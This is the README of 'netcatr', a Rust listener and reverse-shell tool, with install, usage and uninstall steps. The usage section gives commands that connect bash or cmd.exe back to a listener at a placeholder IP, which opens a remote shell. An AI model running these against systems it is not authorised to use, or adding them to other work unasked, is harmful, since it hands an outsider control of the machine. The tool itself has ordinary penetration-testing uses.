# 📡 netcatr

```text
              _                 _
 _ __    ___ | |_   ___   __ _ | |_  _ __
| '_ \  / _ \| __| / __| / _` || __|| '__|
| | | ||  __/| |_ | (__ | (_| || |_ | |
|_| |_| \___| \__| \___| \__,_| \__||_|

```

📡 netcatr: A cross-platform port listener and reverse shell application designed for ease of use, providing seamless network connectivity.

## ✨ Features

- Command history & Tab completion (Interactive mode);
- CTRL-C blocking;
- Colors;
- Everything easy;

### Modes

- Listen mode (listen);
- Reverse shell mode (connect);

## 🚀 Installation

To install **netcatr**, simply clone the repository and follow the instructions below:

```bash
git clone git@github.com:trinhminhtriet/netcatr.git
cd netcatr

cargo build --release
cp ./target/release/netcatr /usr/local/bin/
```

Running the below command will globally install the `netcatr` binary.

```bash
cargo install netcatr
```

## 💡 Usage

The most basic and useful example to start listening on a port would be (you can even run vim inside netcatr with this):

```bash
netcatr listen -ib 55600
```

and to connect:

```bash
netcatr connect -s bash the.0.0.ip 55600
```

Reverse shell from Windows:

```bash
netcatr connect -s cmd.exe the.0.0.ip 55600
```

## 🗑️ Uninstallation

Running the below command will globally uninstall the `netcatr` binary.

```bash
cargo uninstall netcatr
```

Remove the project repo

```bash
rm -rf /path/to/git/clone/netcatr
```

## 🤝 How to contribute

We welcome contributions!

- Fork this repository;
- Create a branch with your feature: `git checkout -b my-feature`;
- Commit your changes: `git commit -m "feat: my new feature"`;
- Push to your branch: `git push origin my-feature`.

Once your pull request has been merged, you can delete your branch.

## 📝 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
